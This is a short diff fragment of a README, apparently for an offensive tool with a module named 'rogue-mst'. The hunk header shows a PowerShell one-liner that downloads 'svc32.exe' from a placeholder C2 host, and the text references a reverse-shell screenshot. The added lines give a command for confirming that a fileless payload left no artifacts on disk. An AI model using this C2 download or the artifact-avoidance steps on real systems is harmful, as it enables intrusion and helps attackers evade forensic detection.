@@ -214,6 +214,14 @@ $p=$env:TEMP+'\svc32.exe';(New-Object Net.WebClient).DownloadFile('http://<C2>/l
 
 <p align="center"> <img src="src/6_revshell.png" /> </p>
 
+To verify whole payload executed as fileless and no artifacts left behind, we can run following command:
+
+```powershell
+Get-ChildItem -Path "C:\" -Filter "<MALWARE>" -Recurse -File -ErrorAction SilentlyContinue
+```
+
+<p align="center"> <img src="src/7_filelessexec.png" /> </p>
+
 ---
 
 #### Using **"Module 2 - ``rogue-mst``"**:
